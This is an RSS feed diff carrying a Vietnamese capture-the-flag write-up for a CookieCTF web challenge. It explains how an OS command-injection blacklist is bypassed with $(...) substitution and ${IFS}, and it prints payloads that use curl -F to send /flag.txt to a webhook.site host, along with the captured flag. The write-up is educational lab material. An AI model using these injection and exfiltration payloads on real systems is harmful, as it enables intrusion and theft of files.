@@ -1,0 +1,41 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>Cookiectf - Tag - g03m0n</title>
+        <link>https://g03m0n.github.io/tags/cookiectf/</link>
+        <description>Cookiectf - Tag - g03m0n</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/cookiectf/" rel="self" type="application/rss+xml" /><item>
+    <title>CookieCTF - The Existed File</title>
+    <link>https://g03m0n.github.io/posts/cookiectf---the-existed-file/cookiectf-the-existed-file/</link>
+    <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cookiectf---the-existed-file/cookiectf-the-existed-file/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/arenas/mini-ctf-web-hacking/battle/the-existed-file" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge.</p>
+<p></p>
+<p>Thử nhập <code>/flag.txt</code> vẫn không có thay đổi gì. Ta thử nhập <code>cat /flag.txt</code> xem có xem được <code>flag</code> không nhưng lại hiện ra thông báo <code>Blacklist characters detected!</code>.</p>
+<p></p>
+<p>Kiểm tra <code>soucre code</code> có thể thấy luồng hoạt động của server.</p>
+<p></p>
+<p>Đoạn code này loại bỏ khoảng trắng của <code>input</code> người dùng nhập vào. Nó sử dụng phương thức <code>translate()</code> của lớp <code>string</code> để thay thế tất cả các ký tự khoảng trắng bằng giá trị <code>None</code>.
+Sau đó sẽ sử dung hàm <code>is_blacklisted</code> để kiểm tra <code>input</code> có nằm trong blacklist hay không.</p>
+<p>Có thể thấy <code>blacklist</code> đã loại bỏ hầu hết các câu lệnh giúp ta đọc được file <code>flag</code>, tuy nhiên anh dev có lẽ đã quên mất <code>filter</code> 1 cái nữa đó là <code>$(command)</code>. Câu lệnh này tương đương với sử dụng dấu <code>backstick</code>.</p>
+<p></p>
+<p>Quay lại challenge thử chạy luôn nhưng nó vẫn không xuất được nội dung</p>
+<p></p>
+<p>Tới đây ta để ý <code>blacklist</code> không lọc lệnh <code>curl</code> nên ta có thể gửi file <code>flag</code> qua host khác để đọc bằng option <code>-F</code>.
+Ở đây mình sử dụng <code>webhook.site</code> để làm host nhận file.</p>
+<p>Payload: <code>curl -F @/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
+<p>Nhưng vẫn còn hàm <code>translate()</code> loại bỏ khoảng trắng của <code>input</code>. Search gg một lúc thì mình tìm được cái này:</p>
+<p></p>
+<p>Có thể sử dụng <code>${IFS}</code> để thay thế các ký tự <code>&lt;space&gt;</code> <code>&lt;tab&gt;</code> <code>&lt;newline&gt;</code>.</p>
+<p>Payload: <code>$(curl${IFS}-F${IFS}file=@/flag.txt${IFS}https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11)</code></p>
+<p></p>
+<p>Tải file <code>flag.txt</code>về ta được flag:
+<code>CHH{os_c0mManD_INj3cTi0N_bypa5S_FIL7Er_b1f4b3371b6a365f47334d3ec07a8d0e}</code></p>
+]]></description>
+</item>
+</channel>
+</rss>
